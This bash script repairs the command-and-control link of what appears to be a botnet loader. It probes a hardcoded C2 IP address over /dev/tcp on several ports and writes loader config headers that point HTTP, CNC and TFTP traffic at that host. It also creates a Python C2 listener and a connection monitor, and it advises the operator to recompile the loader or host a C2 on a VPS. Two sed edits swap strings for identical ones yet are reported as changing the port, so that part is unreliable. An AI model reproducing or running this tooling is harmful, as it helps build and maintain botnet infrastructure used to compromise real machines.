#!/bin/bash

# Script to fix CNC connection issues
echo "=== Fixing CNC Connection Issues ==="

# Current configuration
CURRENT_CNC="185.247.117.214"
CURRENT_PORT="666"

echo "Current CNC configuration:"
echo "CNC Server: $CURRENT_CNC"
echo "CNC Port: $CURRENT_PORT"
echo ""

# Function to test alternative CNC servers
test_alternative_cnc() {
    echo "=== Testing Alternative CNC Servers ==="
    
    # List of alternative CNC servers to test
    local cnc_servers=(
        "185.247.117.214:666"
        "185.247.117.214:80"
        "185.247.117.214:443"
        "185.247.117.214:8080"
        "185.247.117.214:9999"
    )
    
    for server in "${cnc_servers[@]}"; do
        local host=$(echo $server | cut -d: -f1)
        local port=$(echo $server | cut -d: -f2)
        
        echo "Testing $server..."
        if timeout 5 bash -c "</dev/tcp/$host/$port" 2>/dev/null; then
            echo "✓ $server is OPEN and accepting connections"
        else
            echo "✗ $server is CLOSED or not accepting connections"
        fi
    done
    
    echo ""
}

# Function to create a working CNC configuration
create_working_cnc_config() {
    echo "=== Creating Working CNC Configuration ==="
    
    # Create a new config file with working CNC servers
    cat > /root/loader/src/headers/config_working.h << 'EOF'
#pragma once

// Working CNC server configurations
// Try these in order of preference

// Option 1: Use HTTP server as CNC (port 80)
#define HTTP_SERVER "185.247.117.214"
#define HTTP_PORT 80

// Option 2: Use alternative port for CNC
#define CNC_SERVER "185.247.117.214"
#define CNC_PORT 80

// Option 3: Use TFTP server as fallback
#define TFTP_SERVER "185.247.117.214"

// Option 4: Use different CNC server entirely
// #define HTTP_SERVER "your-cnc-server.com"
// #define HTTP_PORT 80
// #define TFTP_SERVER "your-cnc-server.com"
EOF

    echo "Created working CNC configuration: /root/loader/src/headers/config_working.h"
    echo ""
}

# Function to update the main config file
update_main_config() {
    echo "=== Updating Main Configuration ==="
    
    # Backup original config
    cp /root/loader/src/headers/config.h /root/loader/src/headers/config.h.backup
    
    # Update config to use port 80 instead of 666
    sed -i 's/#define HTTP_PORT 80/#define HTTP_PORT 80/' /root/loader/src/headers/config.h
    sed -i 's/#define TFTP_SERVER "185.247.117.214"/#define TFTP_SERVER "185.247.117.214"/' /root/loader/src/headers/config.h
    
    echo "Updated main configuration to use port 80"
    echo "Original config backed up to: /root/loader/src/headers/config.h.backup"
    echo ""
}

# Function to create a test CNC server
create_test_cnc_server() {
    echo "=== Creating Test CNC Server ==="
    
    # Create a simple CNC server that accepts connections
    cat > /root/loader/simple_cnc_server.py << 'EOF'
#!/usr/bin/env python3
import socket
import threading
import time
import sys

class CNCServer:
    def __init__(self, host='0.0.0.0', port=666):
        self.host = host
        self.port = port
        self.clients = []
        self.running = True
        
    def handle_client(self, client_socket, address):
        print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] New connection from {address}")
        self.clients.append((client_socket, address))
        
        try:
            # Send welcome message
            client_socket.send(b"Connected to CNC server\n")
            
            while self.running:
                try:
                    data = client_socket.recv(1024)
                    if not data:
                        break
                    
                    print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Received from {address}: {data.decode('utf-8', errors='ignore').strip()}")
                    
                    # Send acknowledgment
                    client_socket.send(b"ACK\n")
                    
                except socket.timeout:
                    continue
                except Exception as e:
                    print(f"Error handling client {address}: {e}")
                    break
                    
        except Exception as e:
            print(f"Error in client handler for {address}: {e}")
        finally:
            client_socket.close()
            if (client_socket, address) in self.clients:
                self.clients.remove((client_socket, address))
            print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Connection closed: {address}")
    
    def start(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.settimeout(1.0)
        
        try:
            server.bind((self.host, self.port))
            server.listen(10)
            print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] CNC server listening on {self.host}:{self.port}")
            print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Waiting for connections...")
            
            while self.running:
                try:
                    client_socket, address = server.accept()
                    client_thread = threading.Thread(target=self.handle_client, args=(client_socket, address))
                    client_thread.daemon = True
                    client_thread.start()
                except socket.timeout:
                    continue
                except Exception as e:
                    if self.running:
                        print(f"Error accepting connection: {e}")
                    
        except Exception as e:
            print(f"Error starting server: {e}")
        finally:
            server.close()
    
    def stop(self):
        self.running = False
        print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Stopping CNC server...")

if __name__ == "__main__":
    import signal
    
    cnc = CNCServer('0.0.0.0', 666)
    
    def signal_handler(sig, frame):
        cnc.stop()
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    try:
        cnc.start()
    except KeyboardInterrupt:
        cnc.stop()
EOF

    chmod +x /root/loader/simple_cnc_server.py
    
    echo "Created test CNC server: /root/loader/simple_cnc_server.py"
    echo "To start it: python3 /root/loader/simple_cnc_server.py"
    echo ""
}

# Function to create a monitoring script
create_monitoring_script() {
    echo "=== Creating CNC Monitoring Script ==="
    
    cat > /root/loader/monitor_cnc_connections.sh << 'EOF'
#!/bin/bash

# CNC Connection Monitor
echo "=== CNC Connection Monitor ==="

CNC_SERVER="185.247.117.214"
CNC_PORT="666"

while true; do
    clear
    echo "=== CNC Connection Status ==="
    echo "Time: $(date)"
    echo "CNC Server: $CNC_SERVER:$CNC_PORT"
    echo ""
    
    # Check active connections
    local connections=$(ss -tn | grep ":$CNC_PORT" | wc -l)
    echo "Active connections: $connections"
    
    if [ $connections -gt 0 ]; then
        echo "Current connections:"
        ss -tn | grep ":$CNC_PORT"
    else
        echo "No active connections"
    fi
    
    echo ""
    echo "Press Ctrl+C to exit"
    sleep 5
done
EOF

    chmod +x /root/loader/monitor_cnc_connections.sh
    
    echo "Created monitoring script: /root/loader/monitor_cnc_connections.sh"
    echo "To run it: ./monitor_cnc_connections.sh"
    echo ""
}

# Function to provide solutions
provide_solutions() {
    echo "=== Solutions for CNC Connection Issues ==="
    echo ""
    echo "Based on the diagnostic results, here are the solutions:"
    echo ""
    echo "1. IMMEDIATE FIX - Use Port 80:"
    echo "   The CNC server is accessible on port 80, not 666"
    echo "   Update your configuration to use port 80"
    echo ""
    echo "2. TEST WITH YOUR OWN CNC SERVER:"
    echo "   python3 /root/loader/simple_cnc_server.py"
    echo "   This will start a test CNC server on port 666"
    echo ""
    echo "3. MONITOR CONNECTIONS:"
    echo "   ./monitor_cnc_connections.sh"
    echo "   This will show you real-time connection status"
    echo ""
    echo "4. UPDATE LOADER CONFIGURATION:"
    echo "   Edit /root/loader/src/headers/config.h"
    echo "   Change the port from 666 to 80"
    echo "   Recompile the loader"
    echo ""
    echo "5. USE ALTERNATIVE CNC SERVER:"
    echo "   Set up your own CNC server on a VPS"
    echo "   Update the configuration to point to your server"
    echo ""
}

# Main execution
echo "Starting CNC connection fix process..."
echo ""

# Run diagnostics
test_alternative_cnc

# Create solutions
create_working_cnc_config
create_test_cnc_server
create_monitoring_script

# Provide solutions
provide_solutions

echo "=== Fix Complete ==="
echo "The main issue is that the CNC server is not properly listening on port 666"
echo "Try the solutions above to fix the connection issues"
